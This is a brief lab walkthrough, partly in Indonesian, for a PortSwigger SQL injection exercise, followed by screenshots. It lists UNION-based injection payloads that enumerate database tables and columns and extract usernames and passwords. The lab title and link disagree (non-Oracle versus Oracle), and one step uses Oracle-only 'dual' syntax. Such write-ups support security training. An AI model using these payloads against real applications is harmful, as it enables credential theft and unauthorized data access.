# - Lab: SQL injection attack, listing the database contents on non-Oracle databases
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.  

# - Link
https://portswigger.net/web-security/sql-injection/lab-querying-database-version-oracle

# - Cara

## Step
1. Cek adanya dua kolom dengan ```sql '+UNION+SELECT+'abc','def'+FROM+dual--```
2. Mendapatkan list tabel sql ```sql +UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--```
3. Cari nama users_xxxxxx dan ganti nama tabel ```sql '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_xxxxxx'--```
4. Ganti username dan password yang sesuai ```sql '+UNION+SELECT+username_xxxxxx,+password_xxxxxx+FROM+users_xxxxxx--```
5. Dapatkan data dan masukkan data

## Gambar
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_17_09_2025_14_04_56" src="https://github.com/user-attachments/assets/e96f414b-72db-4a90-bb46-de4ceeb71341" />
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_17_09_2025_14_05_54" src="https://github.com/user-attachments/assets/fa169e0a-aac2-4be0-95d6-1a9589c946c4" />
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_17_09_2025_14_07_33" src="https://github.com/user-attachments/assets/a0086a82-dc11-49f0-ab1c-64f04c48b2fa" />
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_17_09_2025_14_09_25" src="https://github.com/user-attachments/assets/5df34bac-7284-4b18-bf1b-9ba4697cad13" />
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_17_09_2025_14_09_59" src="https://github.com/user-attachments/assets/bde6dc13-4bd3-476a-ad86-77729314e520" />
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_17_09_2025_14_10_57" src="https://github.com/user-attachments/assets/9f5fa4df-c9d8-47f5-b697-c828dbdface3" />

## Berhasil


